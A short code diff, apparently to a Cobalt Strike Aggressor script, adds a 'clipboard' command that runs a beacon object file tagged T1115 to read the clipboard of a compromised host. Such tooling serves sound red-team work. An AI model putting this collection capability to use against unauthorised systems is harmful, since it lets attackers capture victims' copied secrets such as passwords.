@@ -1673,3 +1673,13 @@ beacon_command_register(
 	"Returns the auth package, logon server, and current session id of the user you are operating as",
 	"Usage: get_session_info"
 );
+
+alias clipboard {
+	beacon_inline_execute($1, readbof($1, "clipboard", $null, "T1115"), "go", $null);
+}
+
+beacon_command_register(
+	"clipboard",
+	"Retrieves the current contents of the clipboard",
+	"Usage: clipboard"
+);
